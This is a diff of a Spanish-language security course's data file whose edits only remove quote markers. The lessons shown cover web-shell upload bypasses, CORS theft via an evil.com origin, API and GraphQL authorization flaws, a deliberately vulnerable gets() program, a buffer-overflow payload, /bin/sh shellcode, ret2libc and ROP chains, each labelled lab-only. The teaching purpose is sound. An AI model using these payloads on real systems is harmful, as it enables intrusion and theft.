-    "lab": "> ⚠️ Solo en labs propios y aislados. 1. En DVWA → File Upload, sube una imagen normal y observa dónde se guarda y cómo se sirve. 2. Sube una web shell PHP simple; si se bloquea por extensión, prueba variantes: .phtml, .php5, .pHp. 3. Evade validación por Content-Type: cambia el header a image/png en Burp manteniendo el contenido PHP. 4. Evade validación por magic bytes: antepone GIF89a; al códig…",
+    "lab": "⚠️ Solo en labs propios y aislados. 1. En DVWA → File Upload, sube una imagen normal y observa dónde se guarda y cómo se sirve. 2. Sube una web shell PHP simple; si se bloquea por extensión, prueba variantes: .phtml, .php5, .pHp. 3. Evade validación por Content-Type: cambia el header a image/png en Burp manteniendo el contenido PHP. 4. Evade validación por magic bytes: antepone GIF89a; al código…",
     "exercises": [
       "Enumera 5 extensiones alternativas que pueden ejecutar código PHP.",
       "Evade una validación por Content-Type y otra por magic bytes.",
@@ -5627,7 +5627,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Descubrir fallos de lógica de negocio: vulnerabilidades que no rompen la tecnología sino las reglas de la aplicación (precios negativos, saltarse pasos, abusar de descuentos, condiciones de carrera).",
-    "theory": "Descubrir fallos de lógica de negocio: vulnerabilidades que no rompen la tecnología sino las reglas de la aplicación (precios negativos, saltarse pasos, abusar de descuentos, condiciones de carrera). No las detectan los escáneres automáticos; requieren entender el flujo y pensar como un adversario creativo. > ⚠️ Ética: solo en labs propios/autorizados. Manipular transacciones reales es fraude.",
+    "theory": "Descubrir fallos de lógica de negocio: vulnerabilidades que no rompen la tecnología sino las reglas de la aplicación (precios negativos, saltarse pasos, abusar de descuentos, condiciones de carrera). No las detectan los escáneres automáticos; requieren entender el flujo y pensar como un adversario creativo. ⚠️ Ética: solo en labs propios/autorizados. Manipular transacciones reales es fraude.",
     "outcomes": [
       "Modelar el flujo de negocio para encontrar suposiciones frágiles.",
       "Explotar fallos de validación de precios, cantidades y estados.",
@@ -5657,7 +5657,7 @@ export const CLASSES = [
       "Juice Shop (varios retos de lógica).",
       "Burp (Repeater, Intruder y el modo de peticiones paralelas para race conditions)."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Mapea un flujo de compra completo: carrito → checkout → pago → confirmación. 2. Intercepta el checkout y manipula el precio o la cantidad (valores negativos, decimales, cero). 3. Prueba un flow bypass: envía la petición de confirmación sin completar el pago. 4. Abusa de un cupón: aplícalo varias veces o combínalo indebidamente. 5. Explota una race condition: envía pe…",
+    "lab": "⚠️ Solo en labs propios. 1. Mapea un flujo de compra completo: carrito → checkout → pago → confirmación. 2. Intercepta el checkout y manipula el precio o la cantidad (valores negativos, decimales, cero). 3. Prueba un flow bypass: envía la petición de confirmación sin completar el pago. 4. Abusa de un cupón: aplícalo varias veces o combínalo indebidamente. 5. Explota una race condition: envía peti…",
     "exercises": [
       "Encuentra 3 suposiciones del desarrollador que se puedan romper en Juice Shop.",
       "Manipula un precio a un valor negativo y explica el impacto.",
@@ -5678,7 +5678,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "110 min",
     "description": "Auditar la seguridad de APIs REST, hoy el backend de casi toda aplicación moderna.",
-    "theory": "Auditar la seguridad de APIs REST, hoy el backend de casi toda aplicación moderna. Usaremos el OWASP API Security Top 10 como marco, con foco en BOLA/IDOR a nivel de API, autorización rota a nivel de función y exposición excesiva de datos. > ⚠️ Ética: solo en APIs propias/autorizadas. Acceder a datos de otros usuarios reales es un delito.",
+    "theory": "Auditar la seguridad de APIs REST, hoy el backend de casi toda aplicación moderna. Usaremos el OWASP API Security Top 10 como marco, con foco en BOLA/IDOR a nivel de API, autorización rota a nivel de función y exposición excesiva de datos. ⚠️ Ética: solo en APIs propias/autorizadas. Acceder a datos de otros usuarios reales es un delito.",
     "outcomes": [
       "Enumerar endpoints y métodos de una API REST.",
       "Explotar BOLA (Broken Object Level Authorization), el IDOR de las APIs.",
@@ -5708,7 +5708,7 @@ export const CLASSES = [
       "crAPI o VAmPI (APIs deliberadamente vulnerables) y Juice Shop.",
       "Especificación OpenAPI/Swagger si está disponible."
     ],
-    "lab": "> ⚠️ Solo en APIs propias/lab. 1. Descubre endpoints desde el Swagger/OpenAPI o analizando el JS del cliente. 2. Autentícate como usuario A y localiza GET /api/users/{id}/orders. 3. Cambia {id} al de otro usuario y comprueba BOLA. 4. Prueba Broken Function Level Authorization: llama a un endpoint admin (/api/admin/...) con tu token normal. 5. Inspecciona respuestas por exposición excesiva: ¿devue…",
+    "lab": "⚠️ Solo en APIs propias/lab. 1. Descubre endpoints desde el Swagger/OpenAPI o analizando el JS del cliente. 2. Autentícate como usuario A y localiza GET /api/users/{id}/orders. 3. Cambia {id} al de otro usuario y comprueba BOLA. 4. Prueba Broken Function Level Authorization: llama a un endpoint admin (/api/admin/...) con tu token normal. 5. Inspecciona respuestas por exposición excesiva: ¿devuelv…",
     "exercises": [
       "Enumera los endpoints de crAPI y agrúpalos por sensibilidad.",
       "Explota un BOLA y documenta el dato de otro usuario obtenido.",
@@ -5729,7 +5729,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Auditar la seguridad de APIs GraphQL, cada vez más comunes.",
-    "theory": "Auditar la seguridad de APIs GraphQL, cada vez más comunes. GraphQL cambia el modelo (un único endpoint, consultas flexibles) e introduce riesgos propios: introspección, over-fetching, ataques de complejidad (DoS), y los mismos problemas de autorización que REST, a menudo peor gestionados. > ⚠️ Ética: solo en APIs propias/autorizadas.",
+    "theory": "Auditar la seguridad de APIs GraphQL, cada vez más comunes. GraphQL cambia el modelo (un único endpoint, consultas flexibles) e introduce riesgos propios: introspección, over-fetching, ataques de complejidad (DoS), y los mismos problemas de autorización que REST, a menudo peor gestionados. ⚠️ Ética: solo en APIs propias/autorizadas.",
     "outcomes": [
       "Explorar el esquema con introspección y herramientas de GraphQL.",
       "Detectar fallos de autorización (IDOR/BOLA) en queries y mutations.",
@@ -5759,7 +5759,7 @@ export const CLASSES = [
       "DVGA (Damn Vulnerable GraphQL Application) como lab.",
       "clairvoyance para reconstruir esquema si la introspección está deshabilitada."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. Localiza el endpoint GraphQL (/graphql, /api/graphql) y prueba la introspección: ``graphql { __schema { types { name fields { name } } } } ` 2. Con InQL, genera el mapa de queries y mutations disponibles. 3. Prueba IDOR/BOLA: consulta un objeto por ID que no es tuyo (user(id: 2){ email }`). 4. Ejecuta una mutation sensible sin el rol adecuado (autorización rota). 5.…",
+    "lab": "⚠️ Solo en labs propios. 1. Localiza el endpoint GraphQL (/graphql, /api/graphql) y prueba la introspección: ``graphql { __schema { types { name fields { name } } } } ` 2. Con InQL, genera el mapa de queries y mutations disponibles. 3. Prueba IDOR/BOLA: consulta un objeto por ID que no es tuyo (user(id: 2){ email }`). 4. Ejecuta una mutation sensible sin el rol adecuado (autorización rota). 5. Us…",
     "exercises": [
       "Reconstruye el esquema de DVGA con introspección y con clairvoyance (deshabilitada).",
       "Explota un IDOR en una query y otro en una mutation.",
@@ -5780,7 +5780,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "130 min",
     "description": "Explotar dos ataques avanzados a nivel de protocolo e infraestructura: el web cache poisoning, que envenena respuestas cacheadas para afectar a muchos usuarios, y el HTTP request smuggling, que abusa de discrepancias en…",
-    "theory": "Explotar dos ataques avanzados a nivel de protocolo e infraestructura: el web cache poisoning, que envenena respuestas cacheadas para afectar a muchos usuarios, y el HTTP request smuggling, que abusa de discrepancias entre servidores frontend y backend al interpretar los límites de una petición. Son técnicas de alto nivel, muy premiadas en bug bounty. > ⚠️ Ética: solo en labs propios/autorizados (PortSwigger). Estos ataques afectan a infraestructura compartida; nunca los pruebes en producción ajena.",
+    "theory": "Explotar dos ataques avanzados a nivel de protocolo e infraestructura: el web cache poisoning, que envenena respuestas cacheadas para afectar a muchos usuarios, y el HTTP request smuggling, que abusa de discrepancias entre servidores frontend y backend al interpretar los límites de una petición. Son técnicas de alto nivel, muy premiadas en bug bounty. ⚠️ Ética: solo en labs propios/autorizados (PortSwigger). Estos ataques afectan a infraestructura compartida; nunca los pruebes en producción ajena.",
     "outcomes": [
       "Explicar cómo las caches web y las cadenas de proxies procesan peticiones.",
       "Envenenar una cache mediante cabeceras no incluidas en la clave.",
@@ -5810,7 +5810,7 @@ export const CLASSES = [
       "Burp con la extensión HTTP Request Smuggler y Param Miner.",
       "Comprensión de HTTP/1.1 y HTTP/2."
     ],
-    "lab": "> ⚠️ Solo en labs propios/autorizados. 1. Cache poisoning: usa Param Miner para descubrir cabeceras no incluidas en la clave (unkeyed). 2. Inyecta un valor malicioso en esa cabecera y comprueba si se refleja y se cachea. 3. Verifica el envenenamiento accediendo a la URL sin la cabecera (recibes el contenido inyectado). 4. Request smuggling: con HTTP Request Smuggler, detecta la desincronización (…",
+    "lab": "⚠️ Solo en labs propios/autorizados. 1. Cache poisoning: usa Param Miner para descubrir cabeceras no incluidas en la clave (unkeyed). 2. Inyecta un valor malicioso en esa cabecera y comprueba si se refleja y se cachea. 3. Verifica el envenenamiento accediendo a la URL sin la cabecera (recibes el contenido inyectado). 4. Request smuggling: con HTTP Request Smuggler, detecta la desincronización (CL…",
     "exercises": [
       "Explica con un diagrama cómo la cache key deja fuera ciertos inputs.",
       "Envenena una cache vía cabecera unkeyed en un lab.",
@@ -5831,7 +5831,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "120 min",
     "description": "Explotar tres clases de ataques del lado del cliente propias de las aplicaciones JavaScript modernas: configuraciones CORS inseguras que exponen datos, uso inseguro de postMessage entre ventanas/iframes, y prototype pol…",
-    "theory": "Explotar tres clases de ataques del lado del cliente propias de las aplicaciones JavaScript modernas: configuraciones CORS inseguras que exponen datos, uso inseguro de postMessage entre ventanas/iframes, y prototype pollution en JavaScript que puede escalar a XSS o RCE (en Node). Son vectores de moda en el bug bounty actual. > ⚠️ Ética: solo en labs propios/autorizados.",
+    "theory": "Explotar tres clases de ataques del lado del cliente propias de las aplicaciones JavaScript modernas: configuraciones CORS inseguras que exponen datos, uso inseguro de postMessage entre ventanas/iframes, y prototype pollution en JavaScript que puede escalar a XSS o RCE (en Node). Son vectores de moda en el bug bounty actual. ⚠️ Ética: solo en labs propios/autorizados.",
     "outcomes": [
       "Auditar políticas CORS y explotar reflejo del Origin con credenciales.",
       "Detectar manejadores postMessage sin validación de origen.",
@@ -5861,7 +5861,7 @@ export const CLASSES = [
       "Burp con DOM Invader (detecta postMessage y prototype pollution).",
       "Un servidor propio para alojar la página de exploit cross-origin."
     ],
-    "lab": "> ⚠️ Solo en labs propios. 1. CORS: envía una petición con Origin: https://evil.com y observa si se refleja en Access-Control-Allow-Origin junto a Allow-Credentials: true. 2. Aloja un exploit que use fetch con credentials: 'include' para leer datos sensibles cross-origin. 3. Prueba también el origen null (iframe sandbox) si el servidor lo acepta. 4. postMessage: con DOM Invader, localiza un handl…",
+    "lab": "⚠️ Solo en labs propios. 1. CORS: envía una petición con Origin: https://evil.com y observa si se refleja en Access-Control-Allow-Origin junto a Allow-Credentials: true. 2. Aloja un exploit que use fetch con credentials: 'include' para leer datos sensibles cross-origin. 3. Prueba también el origen null (iframe sandbox) si el servidor lo acepta. 4. postMessage: con DOM Invader, localiza un handler…",
     "exercises": [
       "Explota un CORS que refleja el Origin y roba datos autenticados en el lab.",
       "Encuentra un postMessage sin validación de origen y explótalo.",
@@ -5882,7 +5882,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "110 min",
     "description": "Integrar todo lo aprendido en una metodología de bug bounty profesional: elegir programas, respetar el scope, hacer reconocimiento eficiente, priorizar vectores por retorno, y —lo más importante— redactar reportes claro…",
-    "theory": "Integrar todo lo aprendido en una metodología de bug bounty profesional: elegir programas, respetar el scope, hacer reconocimiento eficiente, priorizar vectores por retorno, y —lo más importante— redactar reportes claros con impacto y remediación que sean aceptados y recompensados. > ⚠️ Ética: el bug bounty es hacking autorizado bajo las reglas del programa. Sal del scope o incumple la política y pasas de investigador a atacante ilegal.",
+    "theory": "Integrar todo lo aprendido en una metodología de bug bounty profesional: elegir programas, respetar el scope, hacer reconocimiento eficiente, priorizar vectores por retorno, y —lo más importante— redactar reportes claros con impacto y remediación que sean aceptados y recompensados. ⚠️ Ética: el bug bounty es hacking autorizado bajo las reglas del programa. Sal del scope o incumple la política y pasas de investigador a atacante ilegal.",
     "outcomes": [
       "Interpretar el scope y las reglas de un programa antes de probar.",
       "Estructurar un flujo de reconocimiento y testing eficiente.",
@@ -5912,7 +5912,7 @@ export const CLASSES = [
       "Stack de reconocimiento: subfinder/amass, httpx, nuclei, ffuf, Burp.",
       "Plantilla de reporte propia (título, resumen, pasos, impacto, remediación, referencias)."
     ],
-    "lab": "> ⚠️ Practica el reconocimiento y el reporte en tus propios labs o en programas con scope explícito. No pruebes activos fuera de scope. 1. Elige un programa y lee su política: scope, exclusiones, pruebas prohibidas, safe harbor. 2. Monta un flujo de reconocimiento (solo sobre activos en scope): subdominios → hosts vivos → tecnologías → endpoints. 3. Prioriza por retorno: funciones de negocio crít…",
+    "lab": "⚠️ Practica el reconocimiento y el reporte en tus propios labs o en programas con scope explícito. No pruebes activos fuera de scope. 1. Elige un programa y lee su política: scope, exclusiones, pruebas prohibidas, safe harbor. 2. Monta un flujo de reconocimiento (solo sobre activos en scope): subdominios → hosts vivos → tecnologías → endpoints. 3. Prioriza por retorno: funciones de negocio crític…",
     "exercises": [
       "Resume el scope y las reglas de un programa real en 5 puntos.",
       "Diseña tu pipeline de reconocimiento con comandos concretos.",
@@ -5963,7 +5963,7 @@ export const CLASSES = [
       "Semgrep (SAST), OWASP ZAP (DAST), Dependabot/Trivy/OWASP Dependency-Check (SCA).",
       "securityheaders.com y CSP Evaluator para revisar cabeceras."
     ],
-    "lab": "> Ejercicio aplicado de defensa (revisión y corrección de código). 1. Toma un endpoint vulnerable a SQLi de clases previas y reescríbelo con consultas parametrizadas. 2. Corrige un XSS aplicando codificación de salida por contexto y añade una CSP restrictiva. 3. Endurece las cookies: HttpOnly, Secure, SameSite, y verifica con DevTools. 4. Añade cabeceras de seguridad (HSTS, X-Content-Type-Options…",
+    "lab": "Ejercicio aplicado de defensa (revisión y corrección de código). 1. Toma un endpoint vulnerable a SQLi de clases previas y reescríbelo con consultas parametrizadas. 2. Corrige un XSS aplicando codificación de salida por contexto y añade una CSP restrictiva. 3. Endurece las cookies: HttpOnly, Secure, SameSite, y verifica con DevTools. 4. Añade cabeceras de seguridad (HSTS, X-Content-Type-Options,…",
     "exercises": [
       "Reescribe de forma segura una query vulnerable en dos lenguajes.",
       "Diseña una CSP para una SPA que solo cargue scripts propios.",
@@ -6011,7 +6011,7 @@ export const CLASSES = [
       "Sintaxis AT&T vs Intel: AT&T usa mov $0x1, %eax (origen→destino, prefijos %/$); Intel usa"
     ],
     "tools": [],
-    "lab": "> Entorno propio: todo se compila y ejecuta en tu VM. 1. Crea suma.c: ``c int suma(int a, int b) { return a + b; } int main(void) { return suma(3, 4); } ` 2. Genera ensamblador legible con sintaxis Intel: `bash gcc -O0 -S -masm=intel suma.c -o suma.s cat suma.s ` Localiza push rbp / mov rbp, rsp (prólogo) y pop rbp / ret (epílogo). 3. Compila y desensambla el binario: `bash gcc -O0 suma.c -o suma…",
+    "lab": "Entorno propio: todo se compila y ejecuta en tu VM. 1. Crea suma.c: ``c int suma(int a, int b) { return a + b; } int main(void) { return suma(3, 4); } ` 2. Genera ensamblador legible con sintaxis Intel: `bash gcc -O0 -S -masm=intel suma.c -o suma.s cat suma.s ` Localiza push rbp / mov rbp, rsp (prólogo) y pop rbp / ret (epílogo). 3. Compila y desensambla el binario: `bash gcc -O0 suma.c -o suma o…",
     "exercises": [
       "Convierte a sintaxis AT&T: mov eax, 5, add rbx, rax, lea rax, [rbp-0x4].",
       "Escribe en little-endian los bytes de la dirección 0x00401136.",
@@ -6059,7 +6059,7 @@ export const CLASSES = [
       "Red zone: 128 bytes bajo RSP que una función hoja puede usar sin ajustar RSP. Clave: propia"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Crea frame.c: ``c #include <stdio.h> long triple(long x) { long r = x * 3; return r; } int main(void) { printf(\"%ld\\n\", triple(5)); return 0; } ` 2. Compila con símbolos: gcc -O0 -g frame.c -o frame. 3. Depura y coloca un breakpoint dentro de triple: `bash gdb -q ./frame (gdb) break triple (gdb) run (gdb) info registers rsp rbp rip ` 4. Examina la parte alta del frame para ve…",
+    "lab": "Entorno propio. 1. Crea frame.c: ``c #include <stdio.h> long triple(long x) { long r = x * 3; return r; } int main(void) { printf(\"%ld\\n\", triple(5)); return 0; } ` 2. Compila con símbolos: gcc -O0 -g frame.c -o frame. 3. Depura y coloca un breakpoint dentro de triple: `bash gdb -q ./frame (gdb) break triple (gdb) run (gdb) info registers rsp rbp rip ` 4. Examina la parte alta del frame para ver…",
     "exercises": [
       "Dibuja el stack frame de triple indicando offsets de r, saved RBP y ret address.",
       "Explica con tus palabras qué hacen exactamente call y ret sobre RSP y RIP.",
@@ -6107,7 +6107,7 @@ export const CLASSES = [
       "vmmap: tabla de regiones mapeadas (código, stack, heap, libc) con permisos. Clave: imprescindible"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Compila un binario vulnerable de prueba (sin protecciones, solo para práctica): ``c // vuln.c #include <stdio.h> #include <string.h> void win() { puts(\"¡controlaste el flujo!\"); } void vuln() { char buf[64]; gets(buf); } int main(){ vuln(); return 0; } ` `bash gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln # solo laboratorio ` 2. Arranca en pwndbg: gdb -q ./vuln…",
+    "lab": "Entorno propio. 1. Compila un binario vulnerable de prueba (sin protecciones, solo para práctica): ``c // vuln.c #include <stdio.h> #include <string.h> void win() { puts(\"¡controlaste el flujo!\"); } void vuln() { char buf[64]; gets(buf); } int main(){ vuln(); return 0; } ` `bash gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln # solo laboratorio ` 2. Arranca en pwndbg: gdb -q ./vuln.…",
     "exercises": [
       "Muestra los 8 primeros qwords del stack con un solo comando x/.",
       "Coloca un watchpoint sobre buf y observa cuándo se sobreescribe.",
@@ -6155,7 +6155,7 @@ export const CLASSES = [
       "NOP sled: relleno de instrucciones nop que amplía el margen de acierto al saltar a shellcode."
     ],
     "tools": [],
-    "lab": "> Ejercicio conceptual-aplicado (sin lanzar exploit todavía). 1. Toma el binario vuln de la clase 118 y ábrelo en pwndbg. 2. Desensambla vuln y anota el tamaño del frame que reserva el prólogo (sub rsp, 0x50 → 80 bytes). Ojo: eso no es el tamaño del buffer. El buffer vive en [rbp-0x40] (64 bytes); el offset desde su inicio hasta la dirección de retorno es 64 + 8 (RBP guardado) = 72, el valor que…",
+    "lab": "Ejercicio conceptual-aplicado (sin lanzar exploit todavía). 1. Toma el binario vuln de la clase 118 y ábrelo en pwndbg. 2. Desensambla vuln y anota el tamaño del frame que reserva el prólogo (sub rsp, 0x50 → 80 bytes). Ojo: eso no es el tamaño del buffer. El buffer vive en [rbp-0x40] (64 bytes); el offset desde su inicio hasta la dirección de retorno es 64 + 8 (RBP guardado) = 72, el valor que co…",
     "exercises": [
       "Explica por qué strncpy(dst, src, sizeof(dst)) no siempre es seguro (terminación nula).",
       "Dado un buffer de 32 bytes y saved RBP de 8, ¿cuál es el offset al retorno en x64?",
@@ -6176,7 +6176,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "140 min",
     "description": "Convertir la teoría de la clase 119 en un exploit real y reproducible.",
-    "theory": "Convertir la teoría de la clase 119 en un exploit real y reproducible. Construirás el payload que desborda el buffer, sobrescribe la dirección de retorno y redirige la ejecución a una función objetivo (win()), primero a mano con python -c y luego de forma limpia con pwntools. Es tu primer control efectivo de RIP. > ⚠️ Ética: el binario es tuyo, compilado en tu VM. No apliques esto a software de terceros sin > autorización explícita por escrito.",
+    "theory": "Convertir la teoría de la clase 119 en un exploit real y reproducible. Construirás el payload que desborda el buffer, sobrescribe la dirección de retorno y redirige la ejecución a una función objetivo (win()), primero a mano con python -c y luego de forma limpia con pwntools. Es tu primer control efectivo de RIP. ⚠️ Ética: el binario es tuyo, compilado en tu VM. No apliques esto a software de terceros sin autorización explícita por escrito.",
     "outcomes": [
       "Calcular el offset al retorno y construir el payload de relleno + dirección.",
       "Redirigir la ejecución a una función objetivo controlando RIP.",
@@ -6202,7 +6202,7 @@ export const CLASSES = [
       "pwntools: framework Python para escribir exploits. Clave: context.binary, process,"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Confirma el offset con pwndbg (cyclic 200 → cyclic -l <valor>). Supón que es 72. 2. Averigua la dirección de win: objdump -d vuln | grep '<win>:' o en pwntools elf.symbols.win. 3. Prueba el payload manual: ``bash python3 -c 'import sys;sys.stdout.buffer.write(b\"A\"72 + (0x401156).to_bytes(8,\"little\"))' | ./vuln ` 4. Escríbelo en pwntools (exploit.py): `python from pwn import c…",
+    "lab": "Entorno propio. 1. Confirma el offset con pwndbg (cyclic 200 → cyclic -l <valor>). Supón que es 72. 2. Averigua la dirección de win: objdump -d vuln | grep '<win>:' o en pwntools elf.symbols.win. 3. Prueba el payload manual: ``bash python3 -c 'import sys;sys.stdout.buffer.write(b\"A\"72 + (0x401156).to_bytes(8,\"little\"))' | ./vuln ` 4. Escríbelo en pwntools (exploit.py): `python from pwn import con…",
     "exercises": [
       "Reproduce el exploit contra el mismo binario recompilado en 32 bits (-m32, usa p32).",
       "Cambia el nombre/tamaño del buffer, recalcula el offset y adapta el script.",
@@ -6223,7 +6223,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "130 min",
     "description": "Escribir shellcode propio: código máquina que, inyectado en un proceso, ejecuta una acción del atacante (típicamente lanzar /bin/sh).",
-    "theory": "Escribir shellcode propio: código máquina que, inyectado en un proceso, ejecuta una acción del atacante (típicamente lanzar /bin/sh). Aprenderás a invocar syscalls de Linux desde ensamblador, a extraer los opcodes, a eliminar bytes nulos que romperían las copias de cadenas y a probar el shellcode con un cargador. Es la carga útil clásica del binary exploitation. > ⚠️ Ética: shellcode solo en binarios y VMs propias. Su uso contra sistemas ajenos sin permiso > es delito.",
+    "theory": "Escribir shellcode propio: código máquina que, inyectado en un proceso, ejecuta una acción del atacante (típicamente lanzar /bin/sh). Aprenderás a invocar syscalls de Linux desde ensamblador, a extraer los opcodes, a eliminar bytes nulos que romperían las copias de cadenas y a probar el shellcode con un cargador. Es la carga útil clásica del binary exploitation. ⚠️ Ética: shellcode solo en binarios y VMs propias. Su uso contra sistemas ajenos sin permiso es delito.",
     "outcomes": [
       "Escribir en NASM un execve(\"/bin/sh\") como shellcode de 64 bits.",
       "Extraer los opcodes y cargarlos desde un programa de prueba en C.",
@@ -6250,7 +6250,7 @@ export const CLASSES = [
       "shellcraft: módulo de pwntools que genera shellcode parametrizable. Clave: pwn.asm(pwn.shellcraft.sh())."
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Escribe sh.asm (execve(\"/bin/sh\", NULL, NULL)): ``asm section .text global _start _start: xor rsi, rsi ; argv = NULL (sin bytes nulos) push rsi mov rdi, 0x68732f2f6e69622f ; \"/bin//sh\" (8 bytes, sin byte nulo) push rdi mov rdi, rsp ; rdi -> \"/bin/sh\" xor rdx, rdx ; envp = NULL push 59 pop rax ; syscall execve syscall ` 2. Ensambla y prueba como binario: `bash nasm -f elf64 sh…",
+    "lab": "Entorno propio. 1. Escribe sh.asm (execve(\"/bin/sh\", NULL, NULL)): ``asm section .text global _start _start: xor rsi, rsi ; argv = NULL (sin bytes nulos) push rsi mov rdi, 0x68732f2f6e69622f ; \"/bin//sh\" (8 bytes, sin byte nulo) push rdi mov rdi, rsp ; rdi -> \"/bin/sh\" xor rdx, rdx ; envp = NULL push 59 pop rax ; syscall execve syscall ` 2. Ensambla y prueba como binario: `bash nasm -f elf64 sh.a…",
     "exercises": [
       "Reescribe el shellcode para que ejecute /bin/ls en vez de una shell.",
       "Elimina cualquier byte nulo introducido y explica la técnica usada.",
@@ -6298,7 +6298,7 @@ export const CLASSES = [
       "checksec: utilidad (pwntools/pwndbg) que reporta NX, canary, PIE, RELRO. Clave: primer paso de"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Compila el mismo vuln.c con distintas protecciones y compáralas: ``bash gcc vuln.c -o v_full # todas las mitigaciones por defecto gcc -fno-stack-protector vuln.c -o v_nocanary gcc -no-pie -fno-stack-protector vuln.c -o v_nopie gcc -z execstack -no-pie -fno-stack-protector vuln.c -o v_open ` 2. Audita cada uno: `bash for b in v_full v_nocanary v_nopie v_open; do echo \"== $b ==…",
+    "lab": "Entorno propio. 1. Compila el mismo vuln.c con distintas protecciones y compáralas: ``bash gcc vuln.c -o v_full # todas las mitigaciones por defecto gcc -fno-stack-protector vuln.c -o v_nocanary gcc -no-pie -fno-stack-protector vuln.c -o v_nopie gcc -z execstack -no-pie -fno-stack-protector vuln.c -o v_open ` 2. Audita cada uno: `bash for b in v_full v_nocanary v_nopie v_open; do echo \"== $b ==\";…",
     "exercises": [
       "Rellena una tabla mitigación → ataque que bloquea → debilidad residual.",
       "Explica por qué NX no impide ret2libc.",
@@ -6319,7 +6319,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "130 min",
     "description": "Evadir NX/DEP sin inyectar shellcode: en lugar de ejecutar datos, reutilizas código ya existente en libc.",
-    "theory": "Evadir NX/DEP sin inyectar shellcode: en lugar de ejecutar datos, reutilizas código ya existente en libc. Construirás un exploit ret2libc que salta a system(\"/bin/sh\") colocando el argumento en RDI mediante un gadget pop rdi. También verás cómo un info leak de la GOT derrota ASLR para conocer la base de libc. Es el primer bypass real de mitigaciones. > ⚠️ Ética: exclusivamente en tus binarios de laboratorio o retos autorizados.",
+    "theory": "Evadir NX/DEP sin inyectar shellcode: en lugar de ejecutar datos, reutilizas código ya existente en libc. Construirás un exploit ret2libc que salta a system(\"/bin/sh\") colocando el argumento en RDI mediante un gadget pop rdi. También verás cómo un info leak de la GOT derrota ASLR para conocer la base de libc. Es el primer bypass real de mitigaciones. ⚠️ Ética: exclusivamente en tus binarios de laboratorio o retos autorizados.",
     "outcomes": [
       "Explicar por qué ret2libc evade NX (reutiliza código ejecutable existente).",
       "Filtrar la dirección de una función de libc vía GOT y calcular la base.",
@@ -6346,7 +6346,7 @@ export const CLASSES = [
       "one_gadget: dirección en libc que ejecuta execve(\"/bin/sh\") bajo ciertas condiciones. Clave:"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Audita el binario objetivo: checksec ./ret2libc. Debe mostrar NX enabled, No PIE, No canary. 2. Localiza gadgets y la cadena /bin/sh: ``bash ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep \": pop rdi ; ret\" strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep \"/bin/sh\" ` 3. Fase 1 — fuga: usa un overflow para llamar a puts(GOT['puts']) y luego volver a main: `pyth…",
+    "lab": "Entorno propio. 1. Audita el binario objetivo: checksec ./ret2libc. Debe mostrar NX enabled, No PIE, No canary. 2. Localiza gadgets y la cadena /bin/sh: ``bash ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep \": pop rdi ; ret\" strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep \"/bin/sh\" ` 3. Fase 1 — fuga: usa un overflow para llamar a puts(GOT['puts']) y luego volver a main: `python…",
     "exercises": [
       "Repite el ataque calculando la base a partir de otra función filtrada (printf).",
       "Sustituye la cadena de system por un one_gadget válido.",
@@ -6367,7 +6367,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "140 min",
     "description": "Dominar ROP, la generalización de ret2libc: encadenar múltiples gadgets (fragmentos que terminan en ret) para construir cómputo arbitrario sin inyectar código, evadiendo NX por completo.",
-    "theory": "Dominar ROP, la generalización de ret2libc: encadenar múltiples gadgets (fragmentos que terminan en ret) para construir cómputo arbitrario sin inyectar código, evadiendo NX por completo. Aprenderás a buscar gadgets, a razonar sobre el flujo de una cadena y a realizar un ret2syscall/execve con ROPgadget y el motor ROP de pwntools. > ⚠️ Ética: solo en binarios propios o retos de CTF autorizados.",
+    "theory": "Dominar ROP, la generalización de ret2libc: encadenar múltiples gadgets (fragmentos que terminan en ret) para construir cómputo arbitrario sin inyectar código, evadiendo NX por completo. Aprenderás a buscar gadgets, a razonar sobre el flujo de una cadena y a realizar un ret2syscall/execve con ROPgadget y el motor ROP de pwntools. ⚠️ Ética: solo en binarios propios o retos de CTF autorizados.",
     "outcomes": [
       "Definir qué es un gadget y cómo ret encadena varios.",
       "Buscar gadgets útiles con ROPgadget/ropper.",
@@ -6394,7 +6394,7 @@ export const CLASSES = [
       "pwntools ROP(): constructor que resuelve gadgets y ensambla la cadena. Clave: rop.execve(...),"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Compila un objetivo con muchos gadgets (binario estático): ``bash gcc -static -no-pie -fno-stack-protector vuln.c -o ropme checksec ./ropme ` 2. Busca gadgets clave: `bash ROPgadget --binary ropme | grep -E \": pop rdi ; ret|: pop rsi ; ret|: pop rdx ; ret|: syscall\" ROPgadget --binary ropme --string '/bin/sh' # o coloca tú la cadena en .bss ` 3. Construye una cadena execve(\"/…",
+    "lab": "Entorno propio. 1. Compila un objetivo con muchos gadgets (binario estático): ``bash gcc -static -no-pie -fno-stack-protector vuln.c -o ropme checksec ./ropme ` 2. Busca gadgets clave: `bash ROPgadget --binary ropme | grep -E \": pop rdi ; ret|: pop rsi ; ret|: pop rdx ; ret|: syscall\" ROPgadget --binary ropme --string '/bin/sh' # o coloca tú la cadena en .bss ` 3. Construye una cadena execve(\"/bi…",
     "exercises": [
       "Escribe a mano (sin ROP()) la cadena execve y verifícala en GDB.",
